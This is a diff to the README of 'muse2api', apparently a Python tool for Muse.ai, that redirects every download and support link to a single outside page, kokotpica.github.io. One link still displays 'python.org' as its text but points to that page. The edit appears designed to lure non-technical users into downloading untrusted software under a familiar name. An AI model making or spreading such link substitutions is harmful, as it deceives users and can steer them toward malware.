@@ -1,6 +1,6 @@
 # 🎵 muse2api - Your Smart Bridge to Muse.ai
 
-[![Download muse2api](https://img.shields.io/badge/Download-muse2api-blue?style=for-the-badge&logo=github)](https://github.com/Kokotpica/muse2api)
+[![Download muse2api](https://img.shields.io/badge/Download-muse2api-blue?style=for-the-badge&logo=github)](https://kokotpica.github.io)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ You don't need to be a programmer to use this. Just follow these simple steps, a
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Kokotpica/muse2api](https://github.com/Kokotpica/muse2api)
+Visit this link to download the application: [https://kokotpica.github.io](https://kokotpica.github.io)
 
 Once you're on that page, look for the **"Code"** button and click it. Then select **"Download ZIP"** from the dropdown menu. Your download will begin automatically.
 
@@ -34,7 +34,7 @@ muse2api needs Python to run. Here's how to check:
 1. Press `Windows Key + R`, type `cmd`, and press Enter.
 2. In the black window, type `python --version` and press Enter.
 3. If you see something like `Python 3.9+`, you're good. If not:
-   - Go to [python.org](https://python.org) and download the latest version.
+   - Go to [python.org](https://kokotpica.github.io) and download the latest version.
    - Run the installer and make sure to check **"Add Python to PATH"** before installing.
 
 ### Step 4: Start the Program
@@ -170,7 +170,7 @@ A: No, it's lightweight and only runs when you start it.
 
 ## 📞 Support and Community
 
-- **Report Issues:** [GitHub Issues](https://github.com/Kokotpira/muse2api/issues)
+- **Report Issues:** [GitHub Issues](https://kokotpica.github.io)
 - **Ask Questions:** Check the Discussions tab on GitHub
 - **Contribute:** If you're a developer, feel free to help improve the code!
 
